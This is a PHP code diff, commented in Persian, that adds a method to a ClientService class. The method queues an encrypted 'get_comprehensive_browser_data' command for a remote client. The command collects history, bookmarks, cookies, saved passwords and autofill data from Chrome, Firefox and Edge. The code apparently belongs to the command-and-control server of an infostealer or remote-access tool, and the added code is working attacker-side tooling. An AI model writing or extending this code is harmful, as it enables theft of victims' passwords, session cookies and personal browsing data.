@@ -10,11 +10,13 @@ class ClientService
 {
     private $pdo;
     private $logger;
+    private $encryption; // اضافه کردن property جدید
 
     public function __construct(PDO $pdo, LoggerService $logger)
     {
         $this->pdo = $pdo;
         $this->logger = $logger;
+        $this->encryption = new EncryptionService($logger); // مقداردهی encryption service
     }
 
     public function updateClientStatus(string $clientId, string $ipAddress): void
@@ -85,6 +87,41 @@ class ClientService
         } catch (\PDOException $e) {
             $this->logger->logError("Authorization check failed: " . $e->getMessage());
             return false;
+        }
+    }
+
+    public function queueBrowserDataCommand(string $clientId): array
+    {
+        try {
+            $commandData = [
+                'type' => 'get_comprehensive_browser_data',
+                'params' => [
+                    'browsers' => ['chrome', 'firefox', 'edge'],
+                    'collect_history' => true,
+                    'collect_bookmarks' => true,
+                    'collect_cookies' => true,
+                    'collect_passwords' => true,
+                    'collect_credit_cards' => false, // برای امنیت بهتر غیرفعال
+                    'collect_autofill' => true
+                ],
+                'timestamp' => time()
+            ];
+
+            $encryptedCommand = $this->encryption->encrypt(json_encode($commandData));
+
+            $stmt = $this->pdo->prepare(
+                "INSERT INTO client_commands (client_id, command, status, created_at) 
+            VALUES (?, ?, 'pending', NOW())"
+            );
+            $stmt->execute([$clientId, $encryptedCommand]);
+
+            $commandId = $this->pdo->lastInsertId();
+            $this->logger->logWebhook("Comprehensive browser data command queued with ID: $commandId for client: $clientId");
+
+            return ['status' => 'success', 'command_id' => $commandId];
+        } catch (\PDOException $e) {
+            $this->logger->logError("Error queuing browser data command: " . $e->getMessage());
+            return ['error' => 'Error queuing command: ' . $e->getMessage()];
         }
     }
 
